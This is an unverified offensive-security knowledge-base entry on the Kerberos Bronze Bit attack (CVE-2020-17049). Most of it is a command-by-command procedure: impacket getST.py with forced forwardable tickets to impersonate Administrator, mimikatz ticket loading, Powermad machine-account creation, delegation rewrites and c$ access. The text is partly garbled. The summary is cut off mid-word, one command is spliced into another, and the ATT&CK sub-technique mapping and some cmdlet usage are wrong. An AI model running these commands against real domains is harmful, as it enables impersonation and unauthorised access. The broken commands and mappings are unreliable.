---
id: 443e9c88-7928-475d-8584-f98571401471
name: Kerberos Bronze Bit Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:07.969385+00:00'
updated_at: '2023-04-10T20:26:20.652983+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques:
- '[[AS-REP Roasting|T1558.004 - AS-REP Roasting]]'
- '[[Golden Ticket|T1558.001 - Golden Ticket]]'
- '[[Kerberoasting|T1558.003 - Kerberoasting]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Kerberos Bronze Bit Attack - CVE-2020-17049]]'
commands:
- '[[Accessing "c$"]]'
- '[[Configure Kerberos only]]'
- '[[Configure user account for delegation]]'
- '[[Create a new machine account]]'
- '[[Execute the attack]]'
- '[[getST.py command]]'
- '[[getST.py command with force-forwardable flag]]'
- '[[Load the ticket]]'
- '[[Load the ticket]]'
- '[[Set PrincipalsAllowedToDelegateToAccount]]'
- '[[Specify services for delegation]]'
---

# Kerberos Bronze Bit Attack

## Summary

The Kerberos Bronze Bit Attack, also known as CVE-2020-17049, is a vulnerability that allows an attacker to forge Kerberos tickets and bypass authentication on a Windows domain. This attack takes advantage of the way that Windows Active Directory (AD) handles Kerberos tickets and trusts. By exploit

## Description

# Description

The Kerberos Bronze Bit Attack, also known as CVE-2020-17049, is a vulnerability that allows an attacker to forge Kerberos tickets and bypass authentication on a Windows domain. This attack takes advantage of the way that Windows Active Directory (AD) handles Kerberos tickets and trusts. By exploiting the vulnerability, an attacker can impersonate any user in the domain and gain access to sensitive resources. The Bronze Bit Attack is particularly dangerous because it allows attackers to bypass security measures like multi-factor authentication (MFA) and other access controls.

To perform the attack, the attacker needs to have a valid domain user account and be able to communicate with the domain controller. The attacker can use a combination of the Trust User for Delegation, Force-Forwardable Tickets, and AD Object Write Permission Attack commands to gain the necessary privileges to perform the attack.

This attack has significant business value for attackers as it allows them to gain access to sensitive resources without being detected. It can be used to steal intellectual property, financial information, or other sensitive data.

 

## Requirements

1. Valid domain user account

1. Ability to communicate with the domain controller

1. Privileges to execute Trust User for Delegation, Force-Forwardable Tickets, and AD Object Write Permission Attack commands

 

## Defense

1. Implementing proper network segmentation can limit the attacker's ability to move laterally in the network

1. Enforcing the principle of least privilege can limit the attacker's ability to gain the necessary privileges to perform the attack

1. Monitoring Kerberos events and detecting anomalies can help to detect and respond to this type of attack

 

## Objectives

1. Forge Kerberos tickets to gain unauthorized access to sensitive resources

1. Bypass authentication controls like MFA and other access controls

 

# Instructions

1. To trust a user for delegation to specified services using Kerberos, follow these steps:
1. Open Active Directory Users and Computers.
2. Locate and right-click the user account that you want to trust for delegation, and then click Properties.
3. Click the Account tab, and then click the Account Options button.
4. Select the Trust this user for delegation to specified services only check box.
5. Click the Add button to add the services to which you want to delegate.
6. In the Add Services dialog box, click Users or Computers.
7. In the Select Users, Computers, or Groups dialog box, type the name of the computer account or the service account that you want to add, and then click OK.
8. Click OK to close the Add Services dialog box.
9. Click OK to close the Account Options dialog box.
10. Click OK to close the user account properties dialog box.

 



**Code**: [[Trust this user for delegation to specified servic]]



> This command allows you to trust a user for delegation to specified services only using Kerberos. By doing this, you can bypass the default restriction that prevents a user from using Kerberos to delegate their credentials to another user or service. This is useful if you need to delegate certain tasks to a user, but want to limit their access to only specific services.



**Command** ([[Configure user account for delegation]]):

```bash
Set-ADUser -Identity 'User1' -TrustedForDelegation $true
```





**Command** ([[Specify services for delegation]]):

```bash
Set-ADUser -Identity 'User1' -ServicePrincipalNames 'http/Server1.domain.com', 'http/Server2.domain.com'
```





**Command** ([[Configure Kerberos only]]):

```bash
Set-ADUser -Identity 'User1' -KerberosEncryptionType 'RC4-HMAC-NT', 'AES128-CTS-HMAC-SHA1-96'
```



2. To force forwardable tickets, use the following command:
getST.py -spn <SPN> -impersonate <User> -hashes <LM:NTLM hash> -aesKey <AES hash> <Domain> -force-forwardable -dc-ip <Domain controller>
Replace the placeholders with the actual values for your environment.

 



**Code**: [[# forwardable flag is only protected by the ticket]]



> This command is used to request a service ticket for a specific service principal name (SPN) with the forwardable flag set. The command can be executed by an attacker who has obtained the credentials of a user or service account that is allowed to request tickets for the specified SPN. The -impersonate parameter is used to specify the user whose credentials will be used to request the ticket. The -hashes and -aesKey parameters are used to specify the password hash and AES key, respectively, for the user or service account. The -force-forwardable parameter is used to request a forwardable ticket. The -dc-ip parameter is used to specify the IP address of the domain controller to which the request will be sent. Once the ticket has been obtained, it can be loaded into memory using a tool like Mimikatz and used to access resources on the network, such as the c$ share of a remote server.



**Command** ([[getST.py command with force-forwardable flag]]):

```bash
$ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes <LM:NTLM hash> -aesKey <AES hash> test.local/Service1 -force-forwardable -dc-ip <Domain controller>
```





**Command** ([[getST.py command]]):

```bash
$ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable
```





**Command** ([[Load the ticket]]):

```bash
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit
```





**Command** ([[Accessing "c$"]]):

```bash
ls \\service2.test.local\c$
```



3. This attack involves creating a new machine account and setting the PrincipalsAllowedToDelegateToAccount to the machine account. This allows the attacker to impersonate the machine account and execute commands with the permissions of the account. The attack then executes the getST.py script to obtain a ticket for the machine account and load it using mimikatz.

 



**Code**: [[# Create a new machine account
Import-Module .\Pow]]



> The first step in this attack is to create a new machine account by using the New-MachineAccount cmdlet from the Powermad PowerShell module. The machine account is named AttackerService and the password is set to 'AttackerServicePassword'. The next step is to use mimikatz to obtain the hash for the machine account. This is done by executing the 'kerberos::hash' command with the password and user specified.

The next step is to set the PrincipalsAllowedToDelegateToAccount property of the target computer to the machine account. This is done by using the Set-ADComputer cmdlet from the ActiveDirectory PowerShell module. The target computer in this attack is Service2. Once the property is set, the attacker can impersonate the machine account and execute commands with the permissions of the account.

The attack then executes the getST.py script from the impacket library to obtain a ticket for the machine account. The script is executed with the SPN of the target computer and the machine account credentials. The ticket is obtained in the form of a TGT and is loaded using mimikatz. Once the ticket is loaded, the attacker can use it to authenticate to other services as the machine account.



**Command** ([[Create a new machine account]]):

```bash
Import-Module .\Powermad\powermad.ps1
New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString 'AttackerServicePassword' -AsPlainText -Force)
.\mimikatz\mimikatz.exe "kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local" exit
```





**Command** ([[Set PrincipalsAllowedToDelegateToAccount]]):

```powershell
Install-WindowsFeature RSAT-AD-PowerShell
Import-Module ActiveDirectory
Get-ADComputer AttackerService
Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount
```





**Command** ([[Execute the attack]]):

```bash
python .\impacket\examples\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$
```





**Command** ([[Load the ticket]]):

```bash
.\mimikatz\mimikatz.exe "kerberos::ptc User2.ccache" exit | Out-Null
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[AS-REP Roasting|T1558.004 - AS-REP Roasting]]
- [[Golden Ticket|T1558.001 - Golden Ticket]]
- [[Kerberoasting|T1558.003 - Kerberoasting]]

## Commands Used

- [[Accessing "c$"]]
- [[Configure Kerberos only]]
- [[Configure user account for delegation]]
- [[Create a new machine account]]
- [[Execute the attack]]
- [[getST.py command]]
- [[getST.py command with force-forwardable flag]]
- [[Load the ticket]]
- [[Load the ticket]]
- [[Set PrincipalsAllowedToDelegateToAccount]]
- [[Specify services for delegation]]

## Tags

- [[Active Directory Attacks]]
- [[Kerberos Bronze Bit Attack - CVE-2020-17049]]


